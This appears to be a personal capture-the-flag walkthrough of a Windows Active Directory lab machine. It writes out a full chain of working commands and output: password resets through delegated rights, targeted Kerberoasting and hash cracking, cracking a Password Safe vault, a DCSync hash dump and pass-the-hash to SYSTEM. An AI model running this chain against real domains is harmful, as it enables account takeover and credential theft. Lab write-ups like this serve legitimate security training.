M- We are given initial credentials: Olivia : ichliebedich
# Reconnaissance
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.42
nmap -sU --top-ports=10 -vv 10.10.11.42

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-12 01:31:44Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 55131/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Timeout)
|   Check 4 (port 64506/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-04-12T01:31:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127

```
	- ftp : tried to login with olivia, admin : failed
	- kerberos
	- ldap
	- domain : administrator.htb
## SMB Enumeration
- We test olivia's credentials with SMB
	```bash
smbclient -u 'Olivia' -L 10.10.11.42
> Password : ichliebedich

---OUTPUT---
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
	- We see some default shares.
## Bloodhound Enumeration (Lateral Movement + Privilege Escalation)
- We pass bloodhound to get files to analyze:
	```bash
bloodhound-python -v -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c All
```
	- We get the files.
- Then we start BloodHound
	```bash
sudo neo4j console
bloodhound --disable-gpu # as it causes issues in my VM
```
	- We upload the files. And under Analyze we select "Shortest Paths to Unconstrained Delegation Systems.", Alternatively, we can just search for Olivia, but here we can see a decent map of a good part of the network. We check other options too to get a better idea.
### Lateral Movement till we get user flag
- We find user Olivia and mark user as owned.
	![[Pasted image 20250411143650.png]]
- Then Once we select Olivia, under Node Info we go to "Outbound Object Control" and select "First degree Object Control", to find user Michael, which olivia has GenericAll privileges on it, i.e, has full control.
	![[Pasted image 20250411214502.png]]
	- If we rightclick on GenericAll > Linux we can see how to exploit.
		![[Pasted image 20250411214938.png]]
		- We see we can force change Michael's password:
			```bash
net rpc password "Michael" "Password@123" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "dc.administrator.htb" #Can also use administrrator.htb instead of dc.adminsitrator.htb
```
			- We can check if we can access SMB.
				- Logging in via win-rm works but we don't get any credentials in Desktop.
			- Alternatively we can use 2 other methods:
				```bash
---METHOD-1---
evil-winrm -u Olivia -p ichliebedich -i 10.10.11.42
net users
net users michael Password@123

---METHOD-2--- ( )
pth-net rpc password "Michael" "Password@123" -U "administrator.htb"/"Olivia"%"ffffffffffffffffffffffffffffffff":"NThash" -S "dc.administrator.htb"
```
		- We see other exploits also and try then for learning (**THEY FAILED, CAN SKIP TO NEXT PORTION**)
			- We see we can get a kerberos hash from Michael and try to decrypt it. I download targetted kerberoast python file (https://github.com/ShutdownRepo/targetedKerberoast.git) and exploit it via:
				```bash
sudo python targetedKerberoast.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich'

---OUTPUT---
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (michael)
[+] Printing hash for (michael)
$krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$b715a34a9d380edfce0332f264bdc3a6$c9dc8639eb57403feff17e7722f1e1f9ed254f64b3388e6431a2de0ee2e5eddbd66f0834f0c3991c125270694bcfda8fac93c63338e304950e7f2a9caa1d27a960f2200e4e6afafc4269698eaab64ff4e0d237b7d21fb6cc9fffc42127fa15a164da7cd636adad1b1f5cce60b1148f8d0a8d353506a5bdad62876cc0d1e5fc006b0ad1816d1c8a2d9c13106a29403a197e5c437e91af5508b3c8dfc81840a49b022c1e6090e3d83198793a4cb1098c5a8810b9f5d26ce3c63b4239500cbf1dd8750ac5ac5699a6545f39b02151169dae8affd6b70b10ef349f6221890c7ac8d312f685ec125a1ff85d67e826c1a3b63f5e2c5ee5ab2d9c97a79eea08e23b98abbffe0f951c14961cd2eb499b4d75d93d5512a6feaaa953fd4a8f57dc1d8fa3e6744b45a754b66882d4e79534fbe8fb29b5ffc00f0c5e8aa791d97ac88d257597838dbc806880d79334c657e4190075efc6ef0fd7b6b319e96ddcfa96cb0a1ca1090a1ae21490343849465716949d9ef641cab4a34f2416b0f89b91efa38b6f1a91b6d3c976bf4bfca466666bd4f98153c49be2beb6bff97a1d9f21952b43d1b729995d164157b5d5ef1d9335802247986aaf5735cd0d2f1dcfc9357d9758923068ee586e704a00a09a58222853b4c206b76170f606a3938f3c104ed20aea51620176670dbfca207aad270aa80e976bb5ed500e2f9a0ab6de5c983c50941a7ed953d481c5da7d6b5f7c24a912c12d5b024e82563f2876f751031d1f777a4a42fa264863c83555423216b68ca52c23b58a832c95989705862fea45bcc0fa8a30b47c967410d417e8c25b6b24112aca25eb5a9b60687b7918850ba802406010d04681a4343fd80a6d9ba01f330b7af792528dc7347c984fe010ffdff101e9388d7bddb662acfa0781fc72e2d599c8add74d6ee81115481449a757f7d2eda55e967222c2b45d2656b738dd47cf830722551a64300de9bd0af768099ff61683b1386c0f8fd0c8469c67e3a290f1b3a097fdd6ff694df1b45f39a1fd56b834e7560b5cab34a73940aabfb859ae04c3dfe3a72739334be2ed9fc4973836a6d191dabf0bf5d0e5f52bd24f77b90c27eb1010da3f7389ff34252b4b4887579ae170f0340c5e96092dd0c74bb1d0880272b8e1414a8bd3a6698afa3ee97a053b38ca94f264b6e8b4454f4d403fb379af318568ab59e5467a77aff7de1fdb2619290f94ad428d98dee32a827acd668101bd28cf4172517dbccffc715c69ba940711bafd1876d073770f6650cbce5d79519e03a3d29d154eb5277dc5deda5c59aa29e782190272bdc6653bef5cd47a21ec9ebefb05331436bd4da65bd70c4b172aa48757939f256b4c2ee39989c2d720cde1b37b4e5ad956c58ced8a547367fbc61816ad65f5d732fcc8d6de335ef9bb90f120d01440cf3fdf0fe2d82712d94be3ca362ce5512ff07ce7934b4c4fee531c9e420bbc90eb4b2db6a646f2708ce473c5829ca96e462ed00a718fb82cd81f5e283fcfc94f30e59760419a9dc5
[VERBOSE] SPN removed successfully for (michael)
```
				- We get a hash and try to crack it (but it fails):
					```bash
vi michael.hash # Copy hash here
john michael.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
			- We also see a Shadow Credential attack using pywhisker (https://github.com/ShutdownRepo/pywhisker.git)
				```bash
sudo python pywhisker.py -v -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' --target 'michael' --action 'add'
```
				- We then had to pass the command it gave us using the certificate it generated but it failed:
					```bash
sudo python3 PKINITtools/gettgtpkinit.py -cert-pfx R5RcMwwm.pfx -pfx-pass pvMWabNnb9vhzg8QbZqo administrator.htb/michael R5RcMwwm.ccache


---MAIN-OUTPUT-ERROR---
raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)" 
```
- We then add Michael as Owned in BloodHound.
	- Then like before,  we go to "Outbound Object Control" and select "First degree Object Control" to find user Benjamin.
		- we see we can once again force change a password like earlier:
			```bash
net rpc password "Benjamin" "Benjamax@123" -U "administrator.htb"/"Michael"%"Password@123" -S "administrator.htb" # or -S dc.administrator.htb if added in /etc/hosts as it's more correct
```
			- We check using smbclient like earlier and it works.
				- evil-winrm doesn't connect here
- We add user as owned in BloodHound
	- We don't see any path forward from here.
		- We do know user Emily and Ethan are High Value targets from looking at the network and also checking options like Shortest path to High Value targets etc.
			- We mark them as so.
- On looking back at our nmap we attempt to ftp into the machine with all of the users with credentials we have and get a hit on Benjamin. We see a file to download and get it to our local machine.
	```bash
ftp 10.10.11.42
> Username : Benjamin
> Password : Benjamax@123
> ls
> get Backup.psafe3

---OUTPUT-GET---
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||59999|)
125 Data connection already open; Transfer starting.
100% |**********************************************************|   952       40.00 KiB/s    00:00 ETA
226 Transfer complete.
```
- On searching google "psafe3" the first two links point to Password Safe tool and a hashcat mode.
	- We try to crack this file.
		```bash
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt # -o safepass to save file

--OR--
# googled "john password safe and saw this existed"
pwsafe2john Backup.psafe3 > psafe.hash
john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=pwsafe


---MAIN-OUTPUT-HASHCAT---
Backup.psafe3:tekieromucho

---MAIN-OUTPUT-JOHN---
tekieromucho     (Backu)
```
	- We download the Password Safe tool:
		- https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true
			- I downloaded via the SourceForge link which was a deb file and then passed:
				```bash
sudo dpkg -i <file_name>
```
				- There were some errors and then I ended up passing this which fixed the issue:
					```bash
sudo apt install --fix-broken
```
	- We then either open Password Safe or pass the command to open the gui:
		```bash
pwsafe Backup.psafe3
```
		- And then we enter the Master password.
	- We see data of 3 people, one of them being one of our high value targets, Emily.
		- ![[Pasted image 20250411172038.png]]

| Name            | Username  | Password                       |
| --------------- | --------- | ------------------------------ |
| Alexander Smith | alexander | UrkIbagoxMyUGw0aPlj9B0AXSea4Sw |
| Emily Rodriguez | emily     | UXLCI5iETUsIBoFVTj8yQFKoHjXmb  |
| Emma Johnson    | emma      | WwANQWnmJnGV07WQN8bMS7FMAbjNur |
- Since Emily is our high value target we attempt to use this credentials to login to our target.
	```bash
evil-winrm -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -i 10.10.11.42
```
	- We gain user flag.
### Privilege Escalation for root.txt
- We can now add Emily as owned in BloodHound.
	- On checking First Degree Object Control for Emily we find Emily has Genericrite privilege on user Ethan, which is another high value target that is also the next step closer to domain admin access from the BloondHound network map.
		- On checking how to abuse we pass the targetedkerberoast python command again to get the kerberos hash of ethan:
			```bash
python targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

---OUTPUT---
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$aa111bc71cc80fb0a7a072ca38b45517$8d33ba105b6c0819f9b3323fb795c8761d93083965705f0b35713031ab1277b2aa6f7eb9ef52903676f0e40944b74e8ded4b8eb4fb2fc53d8d98047f7a280492e0cc2086432a1283293e08015843919f7f86eb7a8c82409ecabce52ca13cc5df6c4f1f1182c623ec1e093de5cdfc8b12231b13bd6a743c6fe1eb6ea228fc659c6f610e2b38e852f43feb4ad9db16320f195922c57af1acd3beb0e7f0295d7bc6e249627a75426165930ed018cf37e3f6b71b68e7e1ea27d750559c633b5d7fe31db2ebceb93310a13644948d3342a6627a312837a4360255a2a350b6ecc163cd829bfb58ed4399fa91ba3e365ae2788625d9ab07b7216926af74d5047f3a3d8a68837e0652a32a718cc16bc56e9940240e5a922f0cbfdd8064a044c35c9679fa2c89fcb1555db69bf5944717302828fddc4af0b6861cab88f2a4cd20519b7e10d0fef844e0039ac959bf59b200fcdbec9957925d7e72a7695334bed3f27cba89206bc58416a2b1e204a81c2243348ed9b964846b0aa9fbb840c749795293a341d42943093bbbb3e2a260700ee1f21d5545d72dda3a30b57803cb9934182c69b57d75a7dfbbde6593f6f7036a914ce0b83e790fc530b80630d3d2c6a5af7262e800015dc8bc8a025c65f8a0e895549411a448a5667243bc5beacbb911f63231f331b2380b191294f8b6b7c72cbcb761d11110d4ea1e79c134d0ab7b43bdd3a5c1914445bd43129488e96d55c0145fd14769ec23b1eb2538fc7c99b8ccddf8634cf05486dafe0223c15999a46345811c4fb1cd3c89bc56f302b53c841dca439fa67945c2fd9c097d58aef9fd2dde353644f29d277518ef5ee969dd105c079c912ee8a4ded9311596c0fdb59c77017c350fb90f1303b7a4d413ee4d3a2fe3cae13300a41711fcdd462df2eecc2cefa07f02c02f5ecdb81205e764664bcff9def78bb48e1deda9de5a3e32ae19417156ac2bafbd664bbba0e5585f5764edb2970e980c48a72d35171e2f0ce742bb13ad4d0ab0b27922d33a4dcc1212eba01fe72a91218b54d29ee6b2514954b739e2c18a9e33f285c39713b5ac9af1b9656c06f01905c1c9dc64889533fcc4e7852fe105a765bc062fc3dbd682b2d82c6fb2b016fb44012d1847e3101ffa3e1ce62868367d524c5d4d063758ae069fdbd5a7445336c3ee50f8279afecfa09b12579f1eee798ac11c78158f18e5379c0d5d56456d18bc2bee129b7cbb8dffdedae3fa697edb69a319a48e2f37dd51d3952d11e1ce3298a7253c2561e1e8602e87cea1e1f45133f04a2f63920944ec7c506a5701ae27b4dd3c84483952bd30c172088b989ee2ec494a711d773c329e9a4262fee006aea6667b26c8038b0181de4dca24cafaf48567f4d37421d9b2156ce07f76850fc4bc23583d67afc3f6ccaaee61bf2110ce9f6548b616a4ef8a16584df03147b8d751fd43bc7ee776a3ebc151d6e909cc57a1573a8c6925fda01495a4effbed25773fce1f0f38417369fb08bc25a510afe6e8d13fd3a9b4ef3abc219d29b72671
[VERBOSE] SPN removed successfully for (ethan)
```
			- Note : It initially fails saying clock skew is too great so we fix it with:
				```bash
sudo ntpdate 10.10.11.42 # target ip
```
			- I also try the shadow credential attakck listed in BloodHound but it didn't work similar as before with michael.
		- We copy it into ethan.hash and attempt to crack it with john
			```bash
vi ethan.hash # copy hash here
john ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
limpbizkit       (?)
```
			- This time it works giving us credentials.
- We mark Ethan as Owned and look at First Degree Object Control for him.
	![[Pasted image 20250412003920.png]]
	- We see we can use DSync to gain privileges on Adminsitrator user:
		```bash
impacket-secretsdump 'adminitrator.htb'/'Ethan':'limpbizkit'@'dc.administrator.htb'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:529a5756aaa85395d99c08efcd02cc17:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
...
```
	- We get a dump of all the LM:NT Hashes of the system.
		- We are interested in the Administrator user so we grab it's hash
- We use Pass-the-Hash technique to psexec into the target machine as the administrator:
	```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e administrator@10.10.11.42
>whoami
>cd C:\Users\Admnistrator\Desktop
>type root.txt
---OUTPUT-WHOAMI---
NT authority\system
```
	- We gain Administrator privilege and grab the root flag.
-----
- I also attempt to crack the hash with hashcat:
	```bash
vi admin.hash # Copy "Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::"
hashcat -a 0 -m 1000 admin.hash /usr/share/wordlists/rockyou.txt

---OUTPUT-FAIL---
...
Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3dc553ce4b9fd20bd016e098d2d2fd2e
Time.Started.....: Sat Apr 12 01:06:04 2025 (8 secs)
Time.Estimated...: Sat Apr 12 01:06:12 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1837.1 kH/s (0.13ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 49%

...

```
	- It doesn't find a match.